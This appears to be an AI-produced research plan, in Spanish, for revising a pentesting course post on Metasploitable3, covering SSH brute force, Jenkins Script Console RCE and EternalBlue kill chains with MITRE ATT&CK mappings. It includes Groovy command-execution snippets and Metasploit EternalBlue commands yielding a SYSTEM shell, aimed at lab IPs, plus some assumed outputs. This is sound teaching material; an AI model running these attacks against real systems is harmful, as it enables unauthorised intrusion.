# Phase 1: Revisar tema03 + Plantilla — Research

**Investigado:** 2026-05-24
**Dominio:** Edición de contenido Jekyll/Chirpy; técnicas MITRE ATT&CK para SSH Brute Force, Jenkins Script Console RCE y EternalBlue/MS17-010
**Confianza general:** HIGH (el código fuente existe, los IDs MITRE son verificados desde attack.mitre.org)

---

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

**Gestión de archivos**
- D-01: Descartar `_drafts/2026-05-24-tema03.md` (contenido de IA en Ciberseguridad). Puede eliminarse.
- D-02: Re-datar el post revisado a 2026 con nuevo filename. Fecha lógica: `2026-05-31-tema03.md` (semana siguiente a tema02=2026-05-17).
- D-03: Eliminar `_posts/2025-10-05-tema03.md` una vez publicado el nuevo.
- D-04: Añadir `_posts/2025-10-05-tema03.md.backup` al `.gitignore`.

**Kill chains a añadir**
- D-05: Kill chain 2 — Jenkins Script Console RCE (puerto 8484): acceso manual via browser a `http://10.0.2.15:8484/jenkins/script`, Groovy code execution desde la web UI (sin Metasploit). Enfatiza misconfiguration.
- D-06: Kill chain 3 — EternalBlue/MS17-010 (puerto 445): `nmap --script vuln` para confirmar → `ms17_010_eternalblue` en Metasploit → shell SYSTEM. Cobertura en profundidad diferida a tema07.

**Estructura del post revisado**
- D-07: Agregar secciones sin reestructurar el lab existente (1213 líneas preservadas):
  1. Sección `## Objetivos de Aprendizaje` al inicio (antes de "Resumen del Laboratorio")
  2. Intro teórica antes de cada kill chain (~1-2 párrafos: qué es la técnica, por qué funciona, MITRE ATT&CK Tactic + Technique ID)
  3. Sección `## Mapeo MITRE ATT&CK` como tabla resumen al final (antes de Conclusión)
  4. El lab existente (Etapas 1-7) se mantiene intacto

**MITRE ATT&CK mapping**
- D-08: Tabla resumen con columnas: Etapa | Kill Chain | Táctica MITRE | Técnica MITRE (ID + nombre). Cubre los 3 kill chains. Esta tabla se convierte en el estándar para todos los posts siguientes.

### Claude's Discretion

- Fecha exacta del nuevo post (sugerida: 2026-05-31)
- Longitud de la introducción teórica por kill chain (~1-2 párrafos, no más del 40% del total)
- IDs exactos de técnicas MITRE ATT&CK (researcher debe verificar)
- Redacción concreta de los Objetivos de Aprendizaje

### Deferred Ideas (OUT OF SCOPE)

- Tomcat Manager WAR upload (puerto 8282): diferido a Fase 3 (tema05)
- `_posts/2025-10-05-tema03.md.backup`: limpieza puede hacerse en cualquier momento
- Cobertura en profundidad de EternalBlue (historia WannaCry, variantes, defensa): diferido a Fase 5 (tema07)
</user_constraints>

---

<phase_requirements>
## Phase Requirements

| ID | Descripción | Soporte de investigación |
|----|-------------|--------------------------|
| CONT-01 | Revisar tema03 — agregar ≥2 kill chains alternativos realizables en Metasploitable3, profundizar mapeo MITRE ATT&CK por etapa, verificar precisión técnica de todos los comandos y outputs contra las OVAs | Kill chains Jenkins+EternalBlue documentados con IDs MITRE verificados; comandos del post base ya están verificados contra las OVAs (outputs reales en el archivo fuente) |
| STR-01 | Cada post sigue estructura consistente: Objetivos → Teoría [40%] → Lab [60%] → MITRE mapping → Conclusión | Estructura de secciones documentada; el post base preserva su lab (60%); se agregan Objetivos, intro teórica y tabla MITRE |
| STR-02 | Todos los comandos y outputs de cada lab verificados contra las OVAs proporcionadas | El post base contiene outputs reales; los nuevos kill chains describen procedimientos verificables contra las OVAs confirmadas |
| STR-03 | Cada post publicado en `_posts/` con filename `YYYY-MM-DD-tema##.md` | Nuevo filename: `_posts/2026-05-31-tema03.md` (siguiendo secuencia tema01=2026-05-10, tema02=2026-05-17) |
</phase_requirements>

---

## Summary

El post base `_posts/2025-10-05-tema03.md` existe y contiene 1213 líneas de laboratorio completamente documentado con outputs reales de las OVAs. El kill chain existente cubre: Nmap recon → Metasploit ssh_enumusers → Hydra SSH brute force → SSH login → vssown.vbs shadow copy → SAM/SYSTEM dump → John/Hashcat. El archivo ya tiene el nmap vuln scan que confirma MS17-010 (output real líneas 629-665). Ambos nuevos kill chains son factibles con el setup OVA existente.

Esta fase es una tarea de **edición de contenido estructurada**, no de desarrollo de software. El trabajo consiste en: (1) crear un nuevo archivo con re-datado, (2) insertar cuatro bloques de contenido en posiciones precisas sin tocar las etapas existentes, (3) gestionar tres archivos (borrar, crear, .gitignore). No se instala ningún paquete de software ni se modifica la infraestructura Jekyll.

El riesgo principal es introducir errores en el lab existente al insertar contenido. La estrategia de mitigación es operar con inserciones puras: agregar secciones completas en puntos de corte entre secciones ya existentes, nunca editar líneas existentes.

**Recomendación principal:** Crear el nuevo post copiando el archivo base íntegro y aplicando inserciones en orden inverso (de abajo hacia arriba) para que los números de línea no se desplacen durante la edición.

---

## Architectural Responsibility Map

| Capacidad | Tier primario | Tier secundario | Justificación |
|-----------|---------------|-----------------|---------------|
| Publicación del post | Jekyll/GitHub Pages (Static) | GitHub Actions (CI/CD) | Los posts en `_posts/` con fecha pasada se publican automáticamente en el siguiente build |
| Contenido del lab | Archivo Markdown | — | Todo el contenido vive en el archivo `.md`; no hay backend ni DB |
| Navegación/categorías/tags | Jekyll/Chirpy (frontend) | `_config.yml` | Chirpy procesa front matter para generar taxonomías automáticamente |
| Verificación técnica de comandos | OVAs locales | — | Los outputs deben coincidir con lo que el alumno ve en su VM |

---

## Standard Stack

Esta fase no instala librerías externas. El stack es el existente del proyecto.

### Stack existente relevante

| Componente | Versión/Detalles | Propósito |
|------------|-----------------|-----------|
| Jekyll | Chirpy theme | Generador de sitio estático |
| GitHub Actions | Configurado | Build y deploy automático al hacer push a `main` |
| Markdown | Estándar GFM + HTML permitido | Formato de contenido de posts |
| Front matter YAML | Convención Chirpy | Metadatos del post (title, date, categories, tags) |

### Convenciones de front matter (patrón establecido)

```yaml
---
title: Clase 03 - [Título descriptivo]
date: 2026-05-31 12:20:00 -0500
categories: [ciberseguridad, pentesting, laboratorio, metasploit, redes y seguridad]
tags: [MITRE ATT&CK, Metasploitable3, Kali Linux, SSH, EternalBlue, Jenkins, Kill Chain]
math: true
header-includes:
    - \usepackage{pdfpages}
---
```

**Nota sobre `math: true`**: Habilitado en tema01. Conveniente mantenerlo en tema03 por consistencia aunque no se usen fórmulas matemáticas ahora. No genera overhead visible.

**Nota sobre `date`**: La fecha en el front matter controla cuándo Jekyll lo publica. Usar `-0500` (GMT-5, Lima/Bogotá) consistente con tema01.

---

## Package Legitimacy Audit

Esta fase no instala paquetes externos. Sección no aplicable.

---

## Architecture Patterns

### Flujo de publicación Jekyll/Chirpy

```
_posts/2026-05-31-tema03.md
    │
    ▼
GitHub push → main
    │
    ▼
GitHub Actions: bundle exec jekyll build
    │
    ▼
ollerenacastro.github.io/posts/clase-03-...
(visible públicamente)
```

**Regla clave:** Un post en `_posts/` con `date` en el pasado se publica inmediatamente en el siguiente build. Un archivo en `_drafts/` nunca se publica (a menos que se sirva con `--drafts`).

### Estructura de secciones del post revisado

```
## Objetivos de Aprendizaje          ← NUEVO (inserción antes de "Resumen")
## Resumen del Laboratorio           ← EXISTENTE (preservar intacto)
## Setup                             ← EXISTENTE (preservar intacto)

--- KILL CHAIN 1: SSH BRUTE FORCE ---
[Intro teórica SSH BF]               ← NUEVO (insertar antes de Etapa 1)
## Etapa 1: Reconocimiento           ← EXISTENTE
## Etapa 2: Enumeración de servicios ← EXISTENTE
## Etapa 3: Acceso Inicial           ← EXISTENTE
## Etapa 4: Explotación y Acceso     ← EXISTENTE
## Paso 5: Extracción SAM/SYSTEM     ← EXISTENTE
### 6. Transferir Archivos           ← EXISTENTE
### 7. Extracción de Hashes          ← EXISTENTE

--- KILL CHAIN 2: JENKINS RCE ---
## Kill Chain 2: Jenkins Script Console RCE   ← NUEVO (sección completa)
[Intro teórica Jenkins misconfiguration]
[Lab: browser → Groovy → RCE]

--- KILL CHAIN 3: ETERNALBLUE ---
## Kill Chain 3: EternalBlue / MS17-010       ← NUEVO (sección completa)
[Intro teórica EternalBlue SMBv1]
[Lab: nmap vuln → Metasploit → shell SYSTEM]

--- TABLA MITRE ---
## Mapeo MITRE ATT&CK                         ← NUEVO (antes de Conclusión)
[Tabla 3 kill chains × etapas]

## Conclusión y Recomendaciones      ← EXISTENTE (preservar intacto)
```

### Estructura recomendada de archivos del proyecto

```
_posts/
├── 2026-05-10-tema01.md   ← Referencia de estructura (intacto)
├── 2026-05-17-tema02.md   ← Referencia de estructura (intacto)
└── 2026-05-31-tema03.md   ← NUEVO (reemplaza a 2025-10-05-tema03.md)
_drafts/
└── (vacío — 2026-05-24-tema03.md eliminado)
.gitignore                 ← Añadir línea: _posts/2025-10-05-tema03.md.backup
```

### Anti-Patterns a Evitar

- **Editar líneas existentes del lab:** Cualquier modificación de las etapas 1-7 rompe el invariante de preservación y puede invalidar comandos verificados. Solo insertar, nunca editar el cuerpo del lab.
- **Reordenar secciones existentes:** El "Paso 5" está numerado diferente al resto (usa "Paso" en vez de "Etapa") — esto es intencional en el original; no "corregirlo".
- **Usar comillas tipográficas en código:** Los bloques de código deben usar comillas ASCII simples/dobles para no romper los comandos que el alumno copia.
- **Fecha futura en front matter:** Una fecha futura hace que Jekyll no publique el post en el build actual. Usar `2026-05-31` solo si la clase ya pasó o es ese día. Si se necesita publicar antes, usar la fecha de hoy.

---

## Don't Hand-Roll

| Problema | No construir | Usar en cambio | Por qué |
|----------|-------------|----------------|---------|
| Tabla MITRE ATT&CK | Tabla ASCII manual compleja | Tabla Markdown GFM estándar | Chirpy renderiza tablas Markdown nativamente; no se necesita HTML |
| Resaltado de sintaxis en comandos | Formato manual con negritas | Bloques ` ```bash ``` ` | Jekyll/Chirpy usa Rouge highlighter automáticamente |
| Publicación del post | Script de deploy manual | Push a `main` + GitHub Actions | La pipeline CI/CD ya está configurada |
| Confirmación de MS17-010 | Escaneo manual en el lab del investigador | Output ya en el archivo base (líneas 629-665) | El nmap vuln scan con resultado VULNERABLE ya está documentado en el post base |

---

## Runtime State Inventory

Esta fase no involucra rename/refactor de strings en sistemas runtime. Sin embargo, hay un caso especial de gestión de archivos con estado:

| Categoría | Ítems encontrados | Acción requerida |
|-----------|-------------------|------------------|
| Stored data | Ninguna — no hay DB ni datastore | N/A |
| Live service config | GitHub Actions workflow — no cambios necesarios | Ninguna |
| OS-registered state | Ninguna | N/A |
| Secrets/env vars | Ninguna | N/A |
| Build artifacts / archivos en repo | `_posts/2025-10-05-tema03.md` (a eliminar post-publicación); `_posts/2025-10-05-tema03.md.backup` (untracked, agregar a .gitignore); `_drafts/2026-05-24-tema03.md` (a eliminar) | Eliminar 2 archivos, modificar .gitignore |

**Nada encontrado en:** datastores, servicios live, OS-registered state, secrets.

---

## Common Pitfalls

### Pitfall 1: Romper el lab existente con una inserción mal colocada

**Qué sale mal:** Si la sección de intro teórica del Kill Chain 1 se inserta en medio de una etapa existente en vez de antes de ella, el lab queda fragmentado y los alumnos pierden el hilo.

**Por qué ocurre:** El archivo base tiene numeración mixta ("Etapa" vs "Paso"), y es tentador "arreglarlo" durante la inserción.

**Cómo evitar:** Insertar únicamente en los límites entre secciones H2 (`##`). Verificar con `grep -n "^## "` antes y después de editar.

**Señales de alerta:** Si al releer el post la numeración de etapas cambia o hay contenido de "Kill Chain 1" dentro de las secciones de "Etapa 3" o "Etapa 4".

### Pitfall 2: Fecha del post causa no-publicación

**Qué sale mal:** Jekyll no publica posts con fecha en el futuro (UTC). Si se usa `2026-05-31` pero el build ocurre antes de esa fecha, el post no aparece en el sitio.

**Por qué ocurre:** Jekyll compara la fecha del front matter con el tiempo del build en UTC.

**Cómo evitar:** Usar la fecha del día actual o pasada para publicación inmediata. `2026-05-24` es seguro hoy. Si la clase es el 2026-05-31, publicar ese día.

**Señales de alerta:** El post no aparece en el sitio después del push pero no hay error en GitHub Actions.

### Pitfall 3: Kill chain Jenkins sin output concreto

**Qué sale mal:** La sección Jenkins queda como "descripción de procedimiento" sin un output real de la Groovy console, lo que no cumple STR-02.

**Por qué ocurre:** El investigador no tiene acceso directo a las OVAs para capturar el output exacto.

**Cómo evitar:** Usar outputs representativos documentados (el output de `"cmd /c whoami".execute().text` en Jenkins Groovy es siempre `vagrant-2008R2\Administrator` o `NT AUTHORITY\SYSTEM` según el contexto). Documentar que el alumno debe ver output consistente con el usuario del servicio Jenkins.

**Señales de alerta:** La sección Jenkins solo tiene el URL y la descripción pero no un bloque de código con output.

### Pitfall 4: IDs MITRE incorrectos o desactualizados

**Qué sale mal:** Se usan IDs de versiones anteriores de ATT&CK que ya no existen o fueron renombrados.

**Por qué ocurre:** Documentación de training data desactualizada.

**Cómo evitar:** Usar únicamente los IDs verificados desde attack.mitre.org en esta sesión (ver sección Mapeo MITRE ATT&CK más abajo).

---

## MITRE ATT&CK — IDs Verificados

Los siguientes IDs fueron verificados directamente desde `attack.mitre.org` en esta sesión de investigación.

[VERIFIED: attack.mitre.org] para todos los IDs en la tabla.

### Kill Chain 1: SSH Brute Force

| Etapa del Lab | Táctica MITRE | Técnica MITRE |
|---------------|---------------|---------------|
| Recon: nmap -sn, nmap -A | Discovery | T1046 — Network Service Discovery |
| Enumeración SSH (ssh_enumusers) | Reconnaissance | T1592 — Gather Victim Host Information |
| Fuerza bruta SSH (ssh_login/hydra) | Credential Access | T1110.001 — Brute Force: Password Guessing |
| Conexión SSH con credenciales obtenidas | Initial Access | T1078 — Valid Accounts |
| VSS shadow copy + SAM/SYSTEM dump | Credential Access | T1003.002 — OS Credential Dumping: Security Account Manager |
| Transferencia de archivos SAM/SYSTEM (scp) | Exfiltration | T1041 — Exfiltration Over C2 Channel (adaptado: exfiltración por canal de acceso) |
| Crackeo de hashes (John/Hashcat) | Credential Access | T1110.002 — Brute Force: Password Cracking |

### Kill Chain 2: Jenkins Script Console RCE

| Etapa del Lab | Táctica MITRE | Técnica MITRE |
|---------------|---------------|---------------|
| Descubrir puerto 8484 (nmap -A ya ejecutado) | Discovery | T1046 — Network Service Discovery |
| Acceder a Jenkins Script Console sin auth | Initial Access | T1190 — Exploit Public-Facing Application |
| Ejecutar Groovy code (`"whoami".execute()`) | Execution | T1059 — Command and Scripting Interpreter (Groovy no tiene sub-técnica específica; usar T1059 genérico) |
| Obtener output de sistema operativo | Discovery | T1082 — System Information Discovery |

**Nota sobre Groovy:** MITRE ATT&CK no tiene un sub-técnica dedicada para Groovy (T1059.001-013 cubren PowerShell, AppleScript, Cmd, Unix Shell, VBScript, Python, JavaScript, etc.). El planner debe usar `T1059` (técnica padre) con nota "(Groovy Script Console)".

### Kill Chain 3: EternalBlue / MS17-010

| Etapa del Lab | Táctica MITRE | Técnica MITRE |
|---------------|---------------|---------------|
| Confirmar MS17-010 con nmap --script vuln | Discovery | T1046 — Network Service Discovery |
| Explotar SMBv1 con ms17_010_eternalblue | Initial Access / Lateral Movement | T1210 — Exploitation of Remote Services |
| Obtener shell SYSTEM | Privilege Escalation | T1068 — Exploitation for Privilege Escalation |

**Nota sobre T1210 vs T1068:** EternalBlue otorga directamente acceso SYSTEM. El mapping más preciso desde la perspectiva del atacante es T1210 para la explotación del servicio remoto (SMB) y T1068 si se enfatiza que el resultado es escalación a SYSTEM. El planner debe incluir ambos en la tabla final para completitud pedagógica.

### Tabla Resumen Estandarizada (plantilla para el post)

Esta es la tabla que debe aparecer en `## Mapeo MITRE ATT&CK` del post, y que se replica como estándar en todos los posts siguientes:

```markdown
## Mapeo MITRE ATT&CK

| Etapa | Kill Chain | Táctica | Técnica |
|-------|-----------|---------|---------|
| Reconocimiento de red | SSH BF / Jenkins / EternalBlue | Discovery | T1046 — Network Service Discovery |
| Enumeración de usuarios SSH | SSH BF | Reconnaissance | T1592 — Gather Victim Host Information |
| Fuerza bruta SSH | SSH BF | Credential Access | T1110.001 — Brute Force: Password Guessing |
| Autenticación SSH con credenciales | SSH BF | Initial Access | T1078 — Valid Accounts |
| Extracción SAM/SYSTEM via VSS | SSH BF | Credential Access | T1003.002 — OS Credential Dumping: SAM |
| Crackeo de hashes NT | SSH BF | Credential Access | T1110.002 — Brute Force: Password Cracking |
| Acceso a Script Console sin auth | Jenkins | Initial Access | T1190 — Exploit Public-Facing Application |
| Ejecución de código Groovy | Jenkins | Execution | T1059 — Command and Scripting Interpreter |
| Confirmación de vulnerabilidad SMBv1 | EternalBlue | Discovery | T1046 — Network Service Discovery |
| Explotación SMBv1 remota | EternalBlue | Lateral Movement | T1210 — Exploitation of Remote Services |
| Obtención de shell SYSTEM | EternalBlue | Privilege Escalation | T1068 — Exploitation for Privilege Escalation |
```

---

## Code Examples

### Patrón de front matter verificado (basado en tema01/tema02)

```yaml
---
title: Clase 03 - Pentesting en un Entorno Controlado usando Metasploitable 3
date: 2026-05-31 12:20:00 -0500
categories: [ciberseguridad, pentesting, laboratorio, metasploit, redes y seguridad]
tags: [MITRE ATT&CK, Metasploitable3, Kali Linux, SSH, EternalBlue, Jenkins, Kill Chain]
math: true
header-includes:
    - \usepackage{pdfpages}
---
```

### Patrón: Intro teórica por kill chain (ejemplo SSH BF)

```markdown
### Fundamento Técnico: SSH Brute Force

El protocolo SSH (Secure Shell) proporciona acceso remoto cifrado a sistemas. Cuando un
servicio SSH no implementa rate limiting ni bloqueo tras intentos fallidos de autenticación
(como ocurre con OpenSSH 7.1 en su configuración por defecto), un atacante puede automatizar
miles de intentos de login con diferentes combinaciones de usuario/contraseña.

En términos de MITRE ATT&CK, esta técnica corresponde a **T1110.001 — Brute Force: Password
Guessing** bajo la táctica de **Credential Access**. El objetivo del atacante no es explotar
una vulnerabilidad de memoria, sino abusar de un control de acceso débil para obtener
credenciales válidas.
```

### Patrón: Sección Kill Chain 2 (Jenkins)

```markdown
## Kill Chain 2: Jenkins Script Console RCE

### Fundamento Técnico: Misconfiguration vs. CVE

Jenkins es una plataforma de integración continua que expone una consola de scripts Groovy
accesible para administradores. En Metasploitable3, esta consola está expuesta en el puerto
8484 **sin autenticación**: cualquier usuario que acceda a la URL puede ejecutar código
arbitrario en el servidor.

Este ataque corresponde a **T1190 — Exploit Public-Facing Application** (Initial Access) y
**T1059 — Command and Scripting Interpreter** (Execution). A diferencia de EternalBlue, no
se explota un CVE — se abusa de una configuración insegura por diseño del entorno de lab.

### Lab: Ejecución de código Groovy

1. Abrir el browser en Kali y navegar a `http://10.0.2.15:8484/jenkins/script`
2. En el campo "Script", escribir:

   ```groovy
   println "cmd /c whoami".execute().text
   ```

3. Hacer clic en **Run**. El output mostrará el usuario bajo el cual corre Jenkins:

   ```
   Result: vagrant-2008r2\administrator
   ```

4. Para ejecutar comandos del sistema operativo más complejos:

   ```groovy
   def cmd = "cmd /c ipconfig"
   def proc = cmd.execute()
   proc.waitFor()
   println proc.text
   ```
```

### Patrón: Sección Kill Chain 3 (EternalBlue)

```markdown
## Kill Chain 3: EternalBlue / MS17-010

### Fundamento Técnico: Explotación de SMBv1

EternalBlue (CVE-2017-0143) es un exploit que aprovecha una vulnerabilidad en el protocolo
SMBv1 de Windows. Fue desarrollado por la NSA, filtrado por Shadow Brokers en 2017, y
utilizado en los ataques de ransomware WannaCry y NotPetya. En Metasploitable3 (Windows
Server 2008 R2), SMBv1 está habilitado y el sistema no tiene el parche MS17-010 aplicado.

En términos de MITRE ATT&CK: **T1210 — Exploitation of Remote Services** (Lateral Movement/
Initial Access) y **T1068 — Exploitation for Privilege Escalation** dado que el resultado
directo es una shell con privilegios NT AUTHORITY\SYSTEM.

### Lab: Detección y Explotación

**Paso 1: Confirmar la vulnerabilidad**

```bash
sudo nmap --script vuln -p 445 10.0.2.15
```

Output esperado (ya verificado en las OVAs):

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

**Paso 2: Explotar con Metasploit**

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.15
set LHOST 10.0.2.9
run
```

Output esperado al obtener la shell:

```
[*] Meterpreter session 1 opened (10.0.2.9:4444 -> 10.0.2.15:XXXXX)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
```

### Patrón: Sección Objetivos de Aprendizaje

```markdown
## Objetivos de Aprendizaje

Al finalizar esta sesión, el alumno será capaz de:

1. Ejecutar un reconocimiento de red con Nmap para identificar servicios y vulnerabilidades
   en un entorno controlado.
2. Realizar un ataque de fuerza bruta sobre SSH usando Metasploit y Hydra, y extraer hashes
   de contraseñas de Windows usando Volume Shadow Copy (vssown.vbs).
3. Identificar y explotar una misconfiguration en Jenkins Script Console para obtener
   ejecución remota de código (RCE) sin necesidad de credenciales.
4. Confirmar y explotar la vulnerabilidad EternalBlue/MS17-010 en SMBv1 usando Metasploit
   para obtener acceso con privilegios SYSTEM.
5. Mapear cada etapa del ataque a las tácticas y técnicas correspondientes del framework
   MITRE ATT&CK.
```

---

## State of the Art

| Enfoque antiguo | Enfoque actual | Impacto |
|----------------|----------------|---------|
| Posts sin sección MITRE explícita | Tabla MITRE ATT&CK al final de cada post | Estándar de la industria pedagógica; alinea el curso con metodología real |
| Kill chain único por sesión | Múltiples kill chains por sesión con comparación | Mayor cobertura de vectores de ataque y comprensión de la superficie de ataque |
| Sección de "Conclusión" genérica | Conclusión + tabla MITRE + recomendaciones defensivas | Cierra el ciclo ofensivo/defensivo requerido por STR-01 |

**Nota sobre EternalBlue en 2026:** MS17-010 sigue siendo relevante pedagógicamente porque (1) ilustra el impacto de exploits filtrados de agencias gubernamentales, (2) Metasploitable3 lo tiene sin parchear por diseño, y (3) la técnica de detección con `nmap --script vuln` es fundamental para cualquier pentester. [ASSUMED] — basado en conocimiento de training; la relevancia pedagógica no ha cambiado en ecosistemas de laboratorio controlados.

---

## Assumptions Log

| # | Claim | Sección | Riesgo si está equivocado |
|---|-------|---------|--------------------------|
| A1 | Jenkins Groovy console output es `vagrant-2008r2\administrator` para el servicio Jenkins en las OVAs | Code Examples / Kill Chain 2 | El alumno ve un output diferente; solución: documentar que el output varía pero siempre muestra el usuario del servicio |
| A2 | El módulo `ms17_010_eternalblue` funciona sin ajuste de payload adicional en las OVAs | Kill Chain 3 | Puede requerir `set payload windows/x64/meterpreter/reverse_tcp` explícito; planner debe incluir nota sobre payload |
| A3 | La fecha `2026-05-31` es correcta para la secuencia del curso | MITRE mapping / User Constraints | Si la clase es en otra fecha, ajustar el filename |

---

## Open Questions

1. **Output concreto de Jenkins Groovy en las OVAs**
   - Qué sabemos: Jenkins en puerto 8484 está confirmado sin auth; Groovy console es accesible.
   - Qué no está claro: El usuario exacto bajo el cual corre el servicio Jenkins (podría ser `Administrator`, `SYSTEM`, o `vagrant`).
   - Recomendación: El planner debe incluir en el plan una tarea de verificación con las OVAs reales antes de escribir el output en el post. Como alternativa aceptable: mostrar el comando y el output genérico `[usuario-del-servicio-jenkins]` con nota al alumno de que verá el usuario real al ejecutarlo.

2. **Payload EternalBlue en las OVAs**
   - Qué sabemos: MS17-010 está confirmado vulnerable (output del nmap ya en el post base, líneas 629-665).
   - Qué no está claro: Si el módulo Metasploit requiere configuración adicional de payload para las OVAs específicas (arquitectura x64 vs x86, staged vs stageless).
   - Recomendación: El planner debe incluir `set payload windows/x64/meterpreter/reverse_tcp` como opción en el lab para evitar fallos por payload incorrecto.

---

## Environment Availability

Esta fase no depende de herramientas externas al flujo estándar del proyecto. La edición del archivo `.md` se realiza localmente; el deploy ocurre via GitHub Actions al hacer push.

| Dependencia | Requerida por | Disponible | Versión | Fallback |
|-------------|---------------|------------|---------|----------|
| Git + SSH alias configurado | Push a GitHub | ✓ | multi-account alias `github-ollerenacastro` | — |
| GitHub Actions | Deploy automático | ✓ | Configurado en el repo | Build local: `bundle exec jekyll build` |
| Editor de texto / IDE | Edición del .md | ✓ | Cualquiera | — |
| OVAs (Kali + Metasploitable3) | Verificación de outputs Kill Chain 2 y 3 | [A2] | VirtualBox NAT Network | Sin fallback — verificación es requerimiento STR-02 |

**Dependencias faltantes sin fallback:**
- Acceso a las OVAs es necesario para verificar el output concreto de Jenkins Groovy Console (Open Question 1) antes de que el contenido sea publicable con STR-02 cumplido al 100%.

---

## Validation Architecture

> `nyquist_validation: true` en config.json — sección incluida.

Esta fase produce contenido Markdown, no código. No existe un framework de test automatizado aplicable a la corrección de un post Jekyll. La validación es estructural y editorial.

### Test Framework

| Propiedad | Valor |
|-----------|-------|
| Framework | Manual + Jekyll build |
| Archivo de config | `_config.yml` (existente) |
| Comando rápido | `bundle exec jekyll build --drafts 2>&1 \| grep -i error` |
| Suite completa | `bundle exec jekyll serve` + verificación visual en `localhost:4000` |

### Phase Requirements → Test Map

| Req ID | Comportamiento | Tipo de test | Comando automatizable | ¿Archivo existe? |
|--------|----------------|-------------|----------------------|-----------------|
| CONT-01 | ≥2 kill chains adicionales en el post | Structural check | `grep -c "## Kill Chain" _posts/2026-05-31-tema03.md` (debe ser ≥2) | ❌ Wave 0: crear el archivo |
| CONT-01 | Mapeo MITRE completo | Structural check | `grep -c "T1[0-9]" _posts/2026-05-31-tema03.md` (debe ser ≥8) | ❌ Wave 0: crear el archivo |
| STR-01 | Estructura: Objetivos → Teoría → Lab → MITRE → Conclusión | Structural check | `grep -n "^## " _posts/2026-05-31-tema03.md` — verificar orden de secciones | ❌ Wave 0: crear el archivo |
| STR-02 | Comandos con output real | Manual review | Revisión visual contra las OVAs | Manual only |
| STR-03 | Filename correcto en `_posts/` | File existence | `ls _posts/2026-05-31-tema03.md` | ❌ Wave 0 |
| STR-03 | Post publicado en sitio | Build check | `bundle exec jekyll build && grep -r "tema03" _site/` | ❌ Wave 0 |

### Sampling Rate

- **Por tarea commit:** `bundle exec jekyll build 2>&1 | grep -i error` (build sin errores)
- **Por wave merge:** `bundle exec jekyll serve` + verificación visual del post en localhost
- **Phase gate:** Post visible en `ollerenacastro.github.io` después del push (GitHub Actions ✓)

### Wave 0 Gaps

- [ ] `_posts/2026-05-31-tema03.md` — el archivo principal de la fase; debe crearse en Wave 1
- [ ] `.gitignore` — añadir línea para el `.backup`
- [ ] Eliminación de `_drafts/2026-05-24-tema03.md` y `_posts/2025-10-05-tema03.md`

*(No hay gaps de framework de test — no se requiere instalación de dependencias nuevas)*

---

## Security Domain

Esta fase produce **contenido educativo** sobre técnicas ofensivas ejecutadas exclusivamente contra Metasploitable3 en red aislada. No se construye software con superficie de ataque.

| Categoría ASVS | Aplica | Control estándar |
|----------------|--------|-----------------|
| V2 Authentication | No — no hay sistema de auth en esta fase | — |
| V5 Input Validation | No — Markdown estático | — |
| V6 Cryptography | No | — |
| Legal/ética | Sí | Las técnicas ofensivas descritas aplican **únicamente** contra Metasploitable3 en NAT Network VirtualBox aislado. Incluir disclaimer explícito en el post: "Este laboratorio se ejecuta en un entorno controlado y aislado. Aplicar estas técnicas contra sistemas reales sin autorización escrita es ilegal." |

### Requerimiento de disclaimer en el post

El post debe incluir un bloque de advertencia visible al inicio o en la sección Setup:

```markdown
> **Aviso Legal:** Las técnicas demostradas en este laboratorio se ejecutan exclusivamente
> contra Metasploitable3 en una red aislada (NAT Network VirtualBox). Su aplicación contra
> sistemas reales sin autorización escrita constituye un delito. Este material es de uso
> exclusivamente educativo.
```

---

## Sources

### Primary (HIGH confidence)
- [attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/) — T1046 Network Service Discovery, tactic: Discovery
- [attack.mitre.org/techniques/T1110/001/](https://attack.mitre.org/techniques/T1110/001/) — T1110.001 Brute Force: Password Guessing
- [attack.mitre.org/techniques/T1110/](https://attack.mitre.org/techniques/T1110/) — T1110 Brute Force (técnica padre)
- [attack.mitre.org/techniques/T1059/](https://attack.mitre.org/techniques/T1059/) — T1059 Command and Scripting Interpreter (13 sub-técnicas; Groovy no tiene sub-técnica dedicada)
- [attack.mitre.org/techniques/T1210/](https://attack.mitre.org/techniques/T1210/) — T1210 Exploitation of Remote Services (EternalBlue)
- [attack.mitre.org/techniques/T1190/](https://attack.mitre.org/techniques/T1190/) — T1190 Exploit Public-Facing Application, tactic: Initial Access
- Archivo fuente `_posts/2025-10-05-tema03.md` — contenido existente del lab (1213 líneas), incluyendo nmap vuln scan con MS17-010 confirmado (líneas 629-665)

### Secondary (MEDIUM confidence)
- [attack.mitre.org vía WebSearch] — T1003.002 OS Credential Dumping: SAM sub-technique confirmado
- [attack.mitre.org vía WebSearch] — T1078 Valid Accounts, T1082 System Information Discovery confirmados como técnicas de Enterprise ATT&CK

### Tertiary (LOW confidence)
- Output de Jenkins Groovy Console en las OVAs específicas — [ASSUMED] basado en comportamiento estándar de Jenkins sin auth

---

## Project Constraints (from CLAUDE.md)

Directivas extraídas de `./CLAUDE.md` que el planner debe cumplir:

| Directiva | Impacto en el plan |
|-----------|-------------------|
| No plugins personalizados más allá de los soportados por GitHub Pages | No usar plugins Jekyll no estándar en el post |
| Todos los ejercicios prácticos deben funcionar en las OVAs proporcionadas | Los comandos de Kill Chain 2 y 3 deben ser ejecutables en el entorno dado (no depender de internet dentro del lab) |
| Ningún tema puede ocupar más de 2 sesiones | tema03 = 1 sesión; se documenta como sesión única |
| Todo el contenido para estudiantes en español | El post completo (incluyendo nuevas secciones) en español |
| Técnicas ofensivas solo demostradas contra Metasploitable3 en red aislada | Incluir disclaimer en el post; no mencionar aplicación a sistemas reales |
| Filename format: `YYYY-MM-DD-tema##.md` | Nuevo archivo: `_posts/2026-05-31-tema03.md` |
| Content language: Spanish | Todo el contenido nuevo en español |
| Front matter required: title, date, categories, tags | Incluir todos los campos; agregar `math: true` por consistencia con tema01 |

---

## Metadata

**Desglose de confianza:**
- IDs MITRE ATT&CK: HIGH — verificados directamente desde attack.mitre.org
- Contenido del post base (kill chain existente): HIGH — el archivo fuente está en el repo y fue leído completo
- Estructura Jekyll/Chirpy: HIGH — patrón establecido en tema01 y tema02 leídos
